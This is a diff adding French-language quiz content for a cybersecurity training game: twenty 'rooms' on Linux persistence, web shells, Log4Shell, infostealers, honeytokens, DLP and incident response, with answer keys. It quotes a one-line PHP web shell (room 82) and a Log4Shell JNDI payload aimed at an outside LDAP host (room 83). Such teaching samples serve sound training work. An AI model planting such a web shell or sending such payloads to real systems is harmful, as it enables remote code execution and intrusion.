@@ -1,0 +1,326 @@
+import type { RoomContent } from "@/lib/types";
+import { answer, card, choice, multi, order, room } from "./_build";
+
+/** Salles 81 à 100 du niveau Très difficile. */
+export const TRES_DIFFICILE_6: RoomContent[] = [
+  room(
+    "tres-difficile-81",
+    "La persistance sous Linux",
+    "Le serveur Linux compromis a été redémarré, mais l'attaquant revient. L'analyste inspecte les endroits classiques de persistance.",
+    card("La persistance Linux", "Système", "🔁", "Sous Linux, un attaquant peut revenir via cron, systemd, les fichiers de shell ou les clés SSH.", [
+      "crontab et /etc/cron.* : tâches planifiées.",
+      "Services systemd (/etc/systemd/system) et fichiers .bashrc / .profile.",
+      "~/.ssh/authorized_keys : une clé ajoutée donne un accès permanent sans mot de passe.",
+    ], "Lequel n'est pas un mécanisme de persistance ?"),
+    multi("Quels emplacements faut-il vérifier ?", [
+      ["Les crontabs", true, "Tâches planifiées relancées automatiquement."],
+      ["Les services systemd", true, "Un service peut relancer la porte dérobée au démarrage."],
+      ["~/.ssh/authorized_keys", true, "Une clé ajoutée permet de revenir sans mot de passe."],
+      ["Le fichier /etc/hostname", false, "Il ne contient que le nom de la machine."],
+    ]),
+    "Clé SSH frauduleuse et tâche cron supprimées. L'attaquant ne revient plus.",
+  ),
+  room(
+    "tres-difficile-82",
+    "Le fichier qui exécute",
+    "Dans le dossier upload du site, un fichier image.php contient une seule ligne : <?php system($_GET['c']); ?>.",
+    card("Le web shell", "Web", "🐚", "Un petit script déposé sur un serveur web qui exécute les commandes du pirate.", [
+      "Il permet d'exécuter des commandes via une simple URL : image.php?c=whoami.",
+      "Signes : fichiers de script dans les dossiers d'upload, processus shell lancés par le serveur web.",
+      "Un processus « w3wp.exe » ou « apache » qui lance cmd ou sh est une alerte majeure.",
+    ], "Que fait la fonction system ?"),
+    choice("Que permet ce fichier ?", [
+      ["Exécuter n'importe quelle commande sur le serveur via l'URL", true, "C'est un web shell."],
+      ["Afficher une image", false, "Malgré son nom, il exécute des commandes."],
+      ["Compresser des fichiers", false, "Non."],
+    ]),
+    "Web shell supprimé, faille d'upload corrigée, serveur reconstruit.",
+  ),
+  room(
+    "tres-difficile-83",
+    "La chaîne magique",
+    "Les journaux du serveur Java montrent un User-Agent étrange : ${jndi:ldap://203.0.113.9:1389/a}.",
+    card("Log4Shell", "Web", "🪵", "Une faille de la bibliothèque Log4j : écrire une chaîne dans un journal suffisait à exécuter du code.", [
+      "Log4j interprétait ${jndi:…} et allait chercher du code sur le serveur indiqué.",
+      "Toute donnée journalisée (User-Agent, nom d'utilisateur, champ de formulaire) pouvait déclencher la faille.",
+      "Correction : mettre à jour Log4j ; détection : chercher ${jndi dans les journaux.",
+    ], "Quelle bibliothèque journalisait la chaîne ?"),
+    answer("Quelle bibliothèque Java est visée par cette attaque ?", ["log4j", "log4j2", "apache log4j"], { placeholder: "Nom de la bibliothèque" }),
+    "Log4j mis à jour, tentatives bloquées par le WAF.",
+  ),
+  room(
+    "tres-difficile-84",
+    "Le voleur discret",
+    "Le poste d'un développeur a exécuté un faux outil. Quelques minutes plus tard, ses sessions GitHub et AWS sont utilisées depuis l'étranger.",
+    card("Les infostealers", "Système", "🦝", "Des malwares qui volent mots de passe, cookies de session et portefeuilles en quelques secondes.", [
+      "Ils vident les navigateurs : mots de passe enregistrés, cookies, historique.",
+      "Les cookies de session volés permettent de contourner la double authentification.",
+      "Réponse : révoquer toutes les sessions et changer tous les secrets du poste.",
+    ], "Que permet un cookie de session volé ?"),
+    order("Remets la réponse dans l'ordre.", [
+      "Isoler le poste infecté",
+      "Révoquer toutes les sessions actives de l'utilisateur",
+      "Changer tous les mots de passe et secrets présents sur le poste",
+      "Réinstaller le poste avant de le rendre",
+    ]),
+    "Sessions révoquées, secrets changés. Les cookies volés ne valent plus rien.",
+  ),
+  room(
+    "tres-difficile-85",
+    "Le faux identifiant",
+    "Dans l'annuaire, un compte « svc_backup_old » n'est utilisé par personne. Il a un mot de passe connu de l'équipe SOC seulement. Ce matin, quelqu'un a essayé de s'y connecter.",
+    card("Les honeytokens", "Défense", "🍯", "Un faux secret ou un faux compte dont toute utilisation trahit un attaquant.", [
+      "Faux compte, fausse clé d'API, faux document : personne de légitime ne doit y toucher.",
+      "La moindre utilisation déclenche une alerte quasiment sans faux positif.",
+      "On peut les placer là où un attaquant cherchera (scripts, partages, mémoire).",
+    ], "Qui est censé utiliser ce compte ?"),
+    choice("Que signifie cette tentative ?", [
+      ["Un attaquant explore l'annuaire : alerte haute confiance", true, "Personne de légitime n'utilise ce compte."],
+      ["Un utilisateur s'est trompé de compte", false, "Ce compte n'est connu ni utilisé par personne."],
+      ["Rien de grave", false, "C'est justement le but du piège."],
+    ]),
+    "Le piège a fonctionné. L'attaquant est repéré dès sa reconnaissance.",
+  ),
+  room(
+    "tres-difficile-86",
+    "Les fichiers canaris",
+    "Des fichiers « 00000_Budget.xlsx » sont placés en tête de chaque partage. S'ils sont modifiés, une alerte sonne.",
+    card("Les fichiers canaris contre les rançongiciels", "Défense", "🐤", "Des fichiers pièges modifiés en premier par un rançongiciel qui chiffre dans l'ordre alphabétique.", [
+      "Leur modification déclenche une alerte et peut isoler automatiquement le poste.",
+      "Leur nom est choisi pour être traité tôt par le rançongiciel.",
+      "Ils complètent la détection comportementale de l'EDR.",
+    ], "Pourquoi « 00000 » au début du nom ?"),
+    choice("Pourquoi les nommer « 00000_… » ?", [
+      ["Pour qu'ils soient chiffrés parmi les premiers", true, "L'alerte sonne avant que trop de fichiers soient touchés."],
+      ["Pour faire joli", false, "Le nom est stratégique."],
+      ["Pour qu'ils soient cachés", false, "Au contraire, ils doivent être trouvés vite."],
+    ]),
+    "Canari modifié à 3 h 02, poste isolé à 3 h 02. Seuls 4 fichiers ont été chiffrés.",
+  ),
+  room(
+    "tres-difficile-87",
+    "Le service non autorisé",
+    "Le proxy révèle que l'équipe marketing envoie tous ses fichiers vers un service de stockage en ligne que personne n'a validé.",
+    card("Le shadow IT", "Défense", "🌑", "Les outils utilisés sans validation de l'informatique échappent à la sécurité.", [
+      "Pas de contrôle des accès, pas de sauvegarde maîtrisée, pas de journalisation.",
+      "Les données peuvent partir hors d'Europe ou rester accessibles après un départ.",
+      "Mieux vaut comprendre le besoin et proposer une solution validée que tout interdire.",
+    ], "Quelle est la meilleure approche ?"),
+    choice("Que faire ?", [
+      ["Comprendre le besoin et proposer un outil validé équivalent", true, "Le besoin est couvert et les données maîtrisées."],
+      ["Bloquer tous les sites sans prévenir", false, "Les équipes trouveront un autre contournement."],
+      ["Ne rien faire, ils sont productifs", false, "Les données sont hors de contrôle."],
+    ]),
+    "Un outil validé remplace le service non autorisé. Tout le monde est content.",
+  ),
+  room(
+    "tres-difficile-88",
+    "La fuite bloquée",
+    "Un employé tente d'envoyer à son adresse personnelle un fichier contenant 3 000 numéros de sécurité sociale. L'envoi est bloqué.",
+    card("La prévention des fuites (DLP)", "Défense", "🚧", "Des outils qui repèrent les données sensibles et bloquent leur sortie.", [
+      "La DLP reconnaît des motifs (numéros de carte, de sécurité sociale) ou des étiquettes de classification.",
+      "Elle peut bloquer, avertir l'utilisateur ou alerter le SOC.",
+      "Elle s'applique au mail, au web, aux clés USB et au cloud.",
+    ], "Un sigle en trois lettres."),
+    answer("Comment s'appelle cette famille d'outils ? (sigle)", ["dlp"], { placeholder: "3 lettres" }),
+    "Envoi bloqué et analysé : c'était une erreur, sans intention malveillante.",
+  ),
+  room(
+    "tres-difficile-89",
+    "La chasse à l'hypothèse",
+    "Aucune alerte n'a sonné. Pourtant l'équipe lance une recherche : « Et si un attaquant utilisait WMI pour se déplacer entre les postes ? »",
+    card("La chasse guidée par une hypothèse", "Défense", "🧭", "Partir d'une hypothèse d'attaque et chercher ses traces, sans attendre une alerte.", [
+      "L'hypothèse s'appuie sur une technique ATT&CK ou un rapport de menace récent.",
+      "On cherche des traces dans les journaux, puis on confirme ou infirme.",
+      "Chaque chasse produit des connaissances : nouvelles règles, angles morts découverts.",
+    ], "Par quoi commence une chasse ?"),
+    order("Remets la démarche dans l'ordre.", [
+      "Formuler une hypothèse à partir d'une technique d'attaque",
+      "Identifier les journaux qui montreraient cette technique",
+      "Lancer les recherches et analyser les résultats",
+      "Transformer les découvertes en règles de détection",
+    ]),
+    "Chasse terminée : deux postes utilisaient WMI de façon anormale.",
+  ),
+  room(
+    "tres-difficile-90",
+    "Les clés exportées",
+    "Le contrôleur de domaine enregistre un événement 4662 suivi d'un accès au secret « BCKUPKEY » : quelqu'un exporte la clé de sauvegarde DPAPI du domaine.",
+    card("DPAPI", "Crypto", "🔐", "Windows protège les mots de passe enregistrés avec DPAPI ; la clé de sauvegarde du domaine peut tout déchiffrer.", [
+      "DPAPI chiffre les mots de passe du navigateur, des Wi-Fi, des identifiants enregistrés.",
+      "La clé de sauvegarde du domaine permet de déchiffrer les secrets DPAPI de tous les utilisateurs.",
+      "Son export signifie une compromission grave du domaine.",
+    ], "Que permet cette clé ?"),
+    choice("Quelle est la gravité ?", [
+      ["Critique : l'attaquant pourra déchiffrer les secrets de tous les utilisateurs", true, "Et il a forcément des droits très élevés."],
+      ["Faible : c'est une simple sauvegarde", false, "C'est une clé maîtresse."],
+      ["Nulle : DPAPI ne sert à rien", false, "DPAPI protège énormément de secrets."],
+    ]),
+    "Incident majeur déclaré. La reconstruction de la confiance du domaine commence.",
+  ),
+  room(
+    "tres-difficile-91",
+    "Le jeton réutilisé",
+    "Un jeton de rafraîchissement Microsoft 365 volé permet à l'attaquant de rester connecté plusieurs semaines, même après le changement du mot de passe.",
+    card("Le vol de jetons", "Mots de passe", "🎟️", "Un jeton d'accès volé permet de se connecter sans mot de passe ni MFA.", [
+      "Les jetons de rafraîchissement peuvent durer longtemps.",
+      "Changer le mot de passe ne suffit pas toujours : il faut révoquer les sessions.",
+      "L'accès conditionnel (appareil conforme, liaison du jeton à l'appareil) limite leur réutilisation.",
+    ], "Que faut-il faire en plus de changer le mot de passe ?"),
+    choice("Quelle action est indispensable ?", [
+      ["Révoquer toutes les sessions et jetons de l'utilisateur", true, "Les jetons volés deviennent invalides."],
+      ["Changer seulement la photo de profil", false, "Non."],
+      ["Attendre que le jeton expire", false, "Ça peut prendre des semaines."],
+    ]),
+    "Jetons révoqués, accès conditionnel renforcé.",
+  ),
+  room(
+    "tres-difficile-92",
+    "Le presse-papiers piégé",
+    "Une victime copie l'adresse de son portefeuille crypto pour recevoir un paiement. L'adresse collée n'est plus la même.",
+    card("Les clippers", "Système", "📋", "Un malware qui remplace les adresses de portefeuille copiées par celle du pirate.", [
+      "Il surveille le presse-papiers et repère les formats d'adresses de cryptomonnaies.",
+      "La victime colle sans vérifier et envoie l'argent au pirate.",
+      "Toujours vérifier le début et la fin de l'adresse collée.",
+    ], "Que surveille ce malware ?"),
+    choice("Que s'est-il passé ?", [
+      ["Un malware a remplacé l'adresse dans le presse-papiers", true, "C'est un clipper."],
+      ["La blockchain a corrigé l'adresse", false, "Une blockchain ne modifie pas ce que tu colles."],
+      ["Le clavier est cassé", false, "Non."],
+    ]),
+    "Clipper supprimé. La victime vérifie désormais chaque adresse collée.",
+  ),
+  room(
+    "tres-difficile-93",
+    "Le carnet piégé",
+    "La pièce jointe est un fichier OneNote. Dedans, un gros bouton « Double-cliquez pour voir le document », qui cache un script .hta.",
+    card("Les pièces jointes OneNote", "Système", "📓", "Quand les macros ont été bloquées, les attaquants sont passés à d'autres formats.", [
+      "OneNote permettait d'intégrer des fichiers exécutables derrière une image.",
+      "Le double-clic lance le script (HTA, VBS, BAT) caché.",
+      "Microsoft a depuis bloqué les extensions dangereuses dans OneNote ; les attaquants changent de format régulièrement.",
+    ], "Que cache le bouton ?"),
+    choice("Que retenir de cette technique ?", [
+      ["Les attaquants changent de format dès qu'un vecteur est bloqué", true, "Macros, ISO, OneNote, HTML… il faut surveiller les comportements."],
+      ["OneNote est toujours dangereux", false, "C'est son usage détourné qui l'était."],
+      ["Les scripts HTA sont inoffensifs", false, "Ils exécutent du code avec les droits de l'utilisateur."],
+    ]),
+    "Extensions dangereuses bloquées dans les pièces jointes.",
+  ),
+  room(
+    "tres-difficile-94",
+    "L'exploitation de la façade",
+    "Le pare-feu VPN de l'entreprise avait une faille critique publiée lundi. Jeudi, des connexions étranges partent du VPN vers l'intérieur.",
+    card("L'exploitation des équipements exposés", "Réseau", "🧱", "Les VPN, pare-feux et passerelles exposés sur Internet sont des cibles prioritaires.", [
+      "Une faille publiée est exploitée en quelques heures ou jours.",
+      "Ces équipements ont souvent peu de journalisation et pas d'EDR.",
+      "Corriger en urgence, et chercher des traces de compromission antérieure au correctif.",
+    ], "Corriger suffit-il ?"),
+    multi("Que faire ?", [
+      ["Appliquer le correctif en urgence", true, "La faille est activement exploitée."],
+      ["Chercher des traces de compromission avant le correctif", true, "L'attaquant est peut-être déjà entré."],
+      ["Changer les identifiants qui transitaient par l'équipement", true, "Ils ont pu être volés."],
+      ["Attendre la maintenance du mois prochain", false, "Beaucoup trop tard."],
+    ]),
+    "Correctif posé, porte dérobée retrouvée et supprimée sur l'équipement.",
+  ),
+  room(
+    "tres-difficile-95",
+    "Le script encodé",
+    "Le journal montre : powershell -enc suivi d'une longue chaîne. L'analyste la décode : c'est du Base64… mais en UTF-16.",
+    card("PowerShell -EncodedCommand", "Système", "🔡", "L'option -enc accepte un script encodé en Base64 (texte UTF-16LE).", [
+      "Une fois décodé, on voit des octets nuls entre chaque lettre : c'est l'UTF-16LE.",
+      "L'encodage sert surtout à éviter les problèmes de guillemets… et à cacher le script.",
+      "La journalisation 4104 montre le script décodé directement.",
+    ], "Que contient la chaîne une fois décodée ?"),
+    answer("Quelle commande PowerShell se cache dans la chaîne ?", ["whoami"], {
+      tools: ["base64", "hex", "reverse"],
+      workshopInput: "dwBoAG8AYQBtAGkA",
+      placeholder: "La commande",
+    }),
+    "« whoami » : l'attaquant vérifiait ses droits. Première étape d'une reconnaissance.",
+  ),
+  room(
+    "tres-difficile-96",
+    "Le niveau de confiance",
+    "Un rapport cite : « Cet acteur est probablement lié au groupe X (confiance modérée) ». Un journaliste écrit : « Le groupe X a attaqué ».",
+    card("Les niveaux de confiance", "Défense", "⚖️", "En renseignement, on exprime toujours le degré de certitude de ses conclusions.", [
+      "Faible, modérée, élevée : chaque niveau repose sur la qualité et le nombre des preuves.",
+      "Des mots comme « probablement » ont un sens précis dans un rapport.",
+      "Transformer une hypothèse en certitude est une erreur fréquente et grave.",
+    ], "« Probablement » veut-il dire « certainement » ?"),
+    choice("Le journaliste a-t-il bien résumé ?", [
+      ["Non : le rapport exprime une hypothèse avec une confiance modérée", true, "Il a transformé un « probablement » en certitude."],
+      ["Oui, c'est la même chose", false, "Le niveau de confiance a un sens."],
+      ["Oui, les rapports exagèrent toujours", false, "Au contraire, ils sont prudents."],
+    ]),
+    "Correction publiée. Le niveau de confiance compte.",
+  ),
+  room(
+    "tres-difficile-97",
+    "Le résumé pour la direction",
+    "L'incident est clos. Le directeur général demande un résumé. Il n'a que deux minutes.",
+    card("Le rapport d'incident", "Défense", "📝", "Un bon rapport s'adapte à son lecteur.", [
+      "Pour la direction : ce qui s'est passé, l'impact, ce qui est réglé, ce qu'il faut décider.",
+      "Pour les équipes techniques : chronologie détaillée, indicateurs, actions.",
+      "Toujours finir par les leçons apprises et les actions de prévention.",
+    ], "Que veut savoir un dirigeant en deux minutes ?"),
+    multi("Que doit contenir le résumé pour la direction ?", [
+      ["L'impact sur l'entreprise (données, activité, coûts)", true, "C'est ce qui l'intéresse en premier."],
+      ["Ce qui est réglé et ce qui reste à faire", true, "Pour savoir où on en est."],
+      ["Les décisions qu'on attend de lui", true, "Budget, communication, priorités."],
+      ["Les 400 lignes de journaux analysées", false, "C'est pour l'annexe technique."],
+    ]),
+    "Résumé validé en deux minutes. Le budget de prévention est accordé.",
+  ),
+  room(
+    "tres-difficile-98",
+    "La revue après incident",
+    "Une semaine après l'incident, toute l'équipe se réunit. Personne n'est mis en cause : on cherche ce qui doit changer.",
+    card("Le retour d'expérience", "Défense", "🔍", "Une revue sans recherche de coupable, pour améliorer les défenses.", [
+      "On reconstruit la chronologie et on note ce qui a bien ou mal fonctionné.",
+      "Chaque problème donne une action concrète, avec un responsable et une date.",
+      "Blâmer les personnes pousse à cacher les erreurs : on corrige le système.",
+    ], "Cherche-t-on un coupable ?"),
+    choice("Quel est le but principal de cette réunion ?", [
+      ["Trouver les améliorations à apporter, sans chercher de coupable", true, "C'est le principe du retour d'expérience."],
+      ["Désigner la personne responsable", false, "Ça pousse à cacher les erreurs à l'avenir."],
+      ["Fêter la fin de l'incident", false, "On peut, mais après le travail !"],
+    ]),
+    "Six actions décidées, chacune avec un responsable et une date.",
+  ),
+  room(
+    "tres-difficile-99",
+    "L'exercice sur table",
+    "Sans aucune vraie attaque, la direction, le SOC, la communication et le juridique simulent une attaque par rançongiciel autour d'une table.",
+    card("L'exercice de crise", "Défense", "🎲", "Simuler un incident pour tester les décisions et la coordination.", [
+      "Un animateur injecte des événements : « les sauvegardes sont chiffrées », « un journaliste appelle ».",
+      "On découvre les trous : qui décide de couper Internet ? Qui prévient la CNIL ?",
+      "Mieux vaut se tromper pendant l'exercice que pendant la vraie crise.",
+    ], "Mieux vaut se tromper quand ?"),
+    choice("Quel est l'intérêt principal ?", [
+      ["Tester les décisions et la coordination avant une vraie crise", true, "Les trous apparaissent sans dégâts réels."],
+      ["Remplacer les sauvegardes", false, "Non."],
+      ["Former uniquement les techniciens", false, "Toute l'organisation participe."],
+    ]),
+    "Exercice réussi : trois procédures manquantes ont été écrites.",
+  ),
+  room(
+    "tres-difficile-100",
+    "La sortie du niveau",
+    "Dernière porte du niveau Très difficile. Le pirate te met au défi : « Remets le cycle de réponse à incident dans l'ordre. »",
+    card("Le cycle de réponse à incident", "Défense", "🏁", "Préparer, détecter, contenir, éradiquer, restaurer, tirer les leçons.", [
+      "Préparation : outils, procédures, équipes prêtes avant l'incident.",
+      "Détection et analyse, puis confinement pour stopper la propagation.",
+      "Éradication, restauration, puis retour d'expérience.",
+    ], "On ne restaure pas avant d'avoir éradiqué."),
+    order("Remets les étapes dans l'ordre.", [
+      "Préparation",
+      "Détection et analyse",
+      "Confinement",
+      "Éradication",
+      "Restauration",
+      "Retour d'expérience",
+    ]),
+    "Niveau Très difficile terminé : tu as le réflexe d'un analyste SOC confirmé !",
+  ),
+];
